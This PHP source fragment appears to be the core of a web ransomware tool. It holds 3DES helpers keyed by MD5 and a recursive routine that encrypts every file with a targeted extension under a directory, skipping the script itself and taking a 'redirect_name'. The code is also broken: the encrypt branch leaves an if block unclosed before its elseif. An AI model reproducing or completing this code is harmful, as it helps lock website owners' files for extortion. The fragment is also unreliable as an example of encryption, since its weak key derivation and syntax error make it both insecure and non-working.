function des3_encrypt($data, $key) {
    $k = md5($key, true) . substr(md5($key, true), 0, 8);
    $iv = openssl_random_pseudo_bytes(8);
    $enc = openssl_encrypt($data, 'des-ede3-cbc', $k, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $enc);
}

function des3_decrypt($data, $key) {
    $k = md5($key, true) . substr(md5($key, true), 0, 8);
    $raw = base64_decode($data);
    if (!$raw || strlen($raw) < 16) return false;
    $iv = substr($raw, 0, 8);
    $ct = substr($raw, 8);
    return openssl_decrypt($ct, 'des-ede3-cbc', $k, OPENSSL_RAW_DATA, $iv);
}

function listAllItems($base) {
    $items = ['folders' => [], 'files' => []];
    if (!is_dir($base)) return $items;
    $scan = scandir($base);
    foreach ($scan as $item) {
        if ($item === '.' || $item === '..' || $item === basename(__FILE__)) continue;
        $full = $base . '/' . $item;
        if (is_dir($full)) $items['folders'][] = $full;
        else $items['files'][] = $full;
    }
    sort($items['folders']); sort($items['files']);
    return $items;
}

function process_recursive($dir, $key, $mode, $redirect_name = '') {
    global $ALLOWED_EXT;
    $log = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..' || $item === basename(__FILE__)) continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            $sub = process_recursive($path, $key, $mode, $redirect_name);
            $log = array_merge($log, $sub);
        } else {
            if ($mode === 'encrypt') {
                $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                if (in_array($ext, $ALLOWED_EXT) && !is_enc($path)) {
                    enc_file($path, $key, $redirect_name);
                    $log[] = ['ok', $path];

            } elseif ($mode === 'decrypt') {
                if (is_enc($path)) {
                    $r = dec_file($path, $key);
                    $log[] = [$r ? 'ok' : 'fail', $path];
                }
            }
        }
    }
    return $log;
}
